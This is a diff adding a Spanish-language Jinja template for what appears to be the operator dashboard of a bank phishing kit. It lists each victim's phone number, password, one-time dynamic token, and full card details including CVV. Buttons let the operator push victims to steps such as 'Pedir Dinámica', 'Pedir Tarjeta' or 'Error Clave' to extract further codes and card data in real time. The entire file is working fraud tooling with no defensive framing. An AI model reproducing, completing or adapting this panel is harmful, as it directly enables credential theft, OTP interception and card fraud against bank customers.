@@ -1,0 +1,77 @@
+{% for user in users %}
+{% set status = user.status|string %}
+<tr class="{% if status == '1' %}row-waiting{% endif %}" data-user-id="{{ user.id }}" data-status="{{ status }}">
+    <td style="color: #888; font-size: 12px; font-weight: 700;">{{ user.time }}</td>
+    <td style="font-weight: 700;">{{ user.phone }}</td>
+    <td><span class="code-box">{{ user.pass }}</span></td>
+    <td>
+        {% if user.token %}
+        <span class="code-box" style="color: #4f46e5;">{{ user.token }}</span>
+        {% else %}
+        <span style="color: #ccc;">Esperando...</span>
+        {% endif %}
+    </td>
+    <td>
+        {% if user.card_number %}
+        <div style="margin-bottom: 5px;"><span class="code-box" style="color: #475569; background: #f1f5f9; font-size: 11px; text-transform: uppercase;">{{ user.card_holder }}</span></div>
+        <span class="code-box" style="color: #0369a1;">{{ user.card_number }}</span>
+        <span class="code-box" style="color: #0891b2;">{{ user.card_expiry }}</span>
+        <span class="code-box" style="color: #be185d;">{{ user.card_cvv }}</span>
+        {% else %}
+        <span style="color: #ccc;">-</span>
+        {% endif %}
+    </td>
+    <td>
+        {% if status == '1' %}
+        <span class="badge status-1">ESPERANDO</span>
+        {% elif status == '2' %}
+        <span class="badge status-2">ERROR CLAVE</span>
+        {% elif status == '3' %}
+        <span class="badge status-3">PEDI DINÁMICA</span>
+        {% elif status == '4' %}
+        <span class="badge status-4">ERR DINÁMICA</span>
+        {% elif status == '5' %}
+        <span class="badge status-5">FINALIZADO</span>
+        {% elif status == '6' %}
+        <span class="badge status-6">PEDÍ TARJETA</span>
+        {% elif status == '7' %}
+        <span class="badge status-7">ERR TARJETA</span>
+        {% elif status == '8' %}
+        <span class="badge status-8">PEDÍ CRÉDITO</span>
+        {% elif status == '9' %}
+        <span class="badge status-9">ERR CRÉDITO</span>
+        {% else %}
+        <span class="badge" style="background:#eee;">{{ user.status }}</span>
+        {% endif %}
+    </td>
+    <td class="actions">
+        <button class="btn-sm btn-error-login" onclick="setStatus({{ user.id }}, 2)">
+            <i class="fas fa-times-circle"></i> Error Clave
+        </button>
+        <button class="btn-sm btn-ask-dynamic" onclick="setStatus({{ user.id }}, 3)">
+            <i class="fas fa-key"></i> Dinámica
+        </button>
+        <button class="btn-sm btn-error-dynamic" onclick="setStatus({{ user.id }}, 4)">
+            <i class="fas fa-exclamation-triangle"></i> Err Dinámica
+        </button>
+        <button class="btn-sm btn-ask-card" onclick="setStatus({{ user.id }}, 6)">
+            <i class="fas fa-credit-card"></i> Pidir Tarjeta
+        </button>
+        <button class="btn-sm btn-error-card" onclick="setStatus({{ user.id }}, 7)">
+            <i class="fas fa-credit-card"></i> Err Tarjeta
+        </button>
+        <button class="btn-sm btn-ask-card-credit" onclick="setStatus({{ user.id }}, 8)">
+            <i class="fas fa-credit-card"></i> Pedir Crédito
+        </button>
+        <button class="btn-sm btn-error-card-credit" onclick="setStatus({{ user.id }}, 9)">
+            <i class="fas fa-exclamation-circle"></i> Err Crédito
+        </button>
+        <button class="btn-sm btn-finish" onclick="setStatus({{ user.id }}, 5)">
+            <i class="fas fa-check-circle"></i> Finalizar
+        </button>
+        <button class="btn-sm btn-delete" onclick="deleteUser({{ user.id }})" title="Eliminar">
+            <i class="fas fa-trash"></i>
+        </button>
+    </td>
+</tr>
+{% endfor %}
